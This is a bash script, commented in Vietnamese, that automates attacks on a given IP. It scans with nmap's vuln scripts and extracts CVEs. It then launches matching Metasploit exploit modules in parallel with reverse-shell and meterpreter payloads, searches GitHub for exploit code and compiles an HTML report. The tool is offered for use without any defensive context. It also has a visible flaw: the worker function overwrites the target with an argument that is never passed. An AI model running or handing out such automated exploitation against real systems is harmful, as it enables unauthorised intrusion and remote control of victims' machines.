#!/bin/bash

TARGET=$1
REPORT_DIR="autopwn_report"
NMAP_OUT="$REPORT_DIR/nmap_scan.txt"
CVE_LIST="$REPORT_DIR/cve_list.txt"
LOG_FILE="$REPORT_DIR/exploit_log.txt"
HTML_REPORT="$REPORT_DIR/report.html"

MAX_JOBS=4  # số exploit chạy song song

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p $REPORT_DIR
> $CVE_LIST
> $LOG_FILE

echo "[*] Quét lỗ hổng bằng Nmap trên $TARGET..."
nmap -sV --script vuln $TARGET -oN $NMAP_OUT

echo "[*] Trích xuất CVE từ kết quả scan..."
grep -Eo "CVE-[0-9]{4}-[0-9]{4,7}" $NMAP_OUT | sort -u > $CVE_LIST

if [ ! -s $CVE_LIST ]; then
    echo "[!] Không tìm thấy CVE nào!"
    exit 1
fi

echo "[+] Danh sách CVE tìm được:"
cat $CVE_LIST

exploit_cve() {
    CVE=$1
    TARGET=$2
    echo -e "\n[+] Đang xử lý CVE: $CVE" | tee -a $LOG_FILE

    # 1. Tìm module Metasploit
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')
    if [ -n "$MODULES" ]; then
        for MODULE in $MODULES; do
            echo "[*] Module Metasploit: $MODULE" | tee -a $LOG_FILE
            PAYLOAD="generic/shell_reverse_tcp"
            if [[ $MODULE == *"windows"* ]]; then
                PAYLOAD="windows/meterpreter/reverse_tcp"
            elif [[ $MODULE == *"linux"* ]]; then
                PAYLOAD="linux/x86/meterpreter/reverse_tcp"
            fi
            msfconsole -q -x "
                use $MODULE;
                set RHOSTS $TARGET;
                set LHOST 0.0.0.0;
                set PAYLOAD $PAYLOAD;
                set EXITFUNC thread;
                run -j;
                exit;
            " | tee -a $LOG_FILE
        done
    else
        echo "[!] Không tìm thấy module Metasploit cho $CVE" | tee -a $LOG_FILE
    fi

    # 2. Tìm exploit trên GitHub
    echo "[*] Tìm exploit $CVE trên GitHub..." | tee -a $LOG_FILE
    GH_LINKS=$(curl -s "https://api.github.com/search/repositories?q=$CVE+exploit&sort=stars&order=desc" \
        | grep '"html_url":' | cut -d '"' -f 4 | head -n 3)
    if [ -n "$GH_LINKS" ]; then
        echo "[+] GitHub exploit:" | tee -a $LOG_FILE
        echo "$GH_LINKS" | tee -a $LOG_FILE
    else
        echo "[!] Không tìm thấy exploit $CVE trên GitHub" | tee -a $LOG_FILE
    fi
}

export -f exploit_cve
export LOG_FILE
export TARGET

echo "[*] Khai thác song song tối đa $MAX_JOBS luồng..."
cat $CVE_LIST | xargs -n 1 -P $MAX_JOBS -I {} bash -c 'exploit_cve "$@"' _ {}

# 3. Xuất báo cáo HTML
echo "[*] Xuất báo cáo HTML..."
{
    echo "<html><body><h1>AutoPWN Report - $TARGET</h1><ul>"
    while read CVE; do
        echo "<li><b>$CVE</b> - <a href='https://nvd.nist.gov/vuln/detail/$CVE' target='_blank'>NVD</a></li>"
    done < $CVE_LIST
    echo "</ul><pre>"
    cat $LOG_FILE
    echo "</pre></body></html>"
} > $HTML_REPORT

echo "[+] Hoàn tất! Báo cáo: $HTML_REPORT"
